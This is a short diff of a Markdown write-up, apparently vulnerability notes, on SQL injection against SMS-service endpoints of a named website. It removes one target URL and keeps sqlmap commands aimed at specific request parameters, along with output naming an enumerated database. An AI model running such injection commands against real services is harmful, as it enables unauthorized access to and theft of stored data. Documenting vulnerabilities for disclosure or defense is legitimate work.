@@ -83,8 +83,6 @@ sqlmap -r queryUserByDepId.txt \
 
 ## sendRecordList
 
-https://web.antgst.com/antgst/sms/otpPremium/channel/sendRecordList?_t=1734511889&column=createTime&order=desc&field=id,,countryName,smsFrom,smsTo,message,sendResult,smsCount,smsFee,sendTime,action&pageNo=1&pageSize=30
-
 ```bash
 sqlmap -r sendRecordList.txt \
 -p field \
@@ -172,7 +170,6 @@ available databases [1]:
 
 the `intl_sys_db` is the database name. then we can use the sqlmap to find other database name.
 
-
 ```bash
 sqlmap -r loadtreedata.txt \
 -p code \
@@ -185,7 +182,6 @@ sqlmap -r loadtreedata.txt \
 --batch \
 --hex
 ```
-
 
 ```bash
 sqlmap -r loadtreedata.txt \
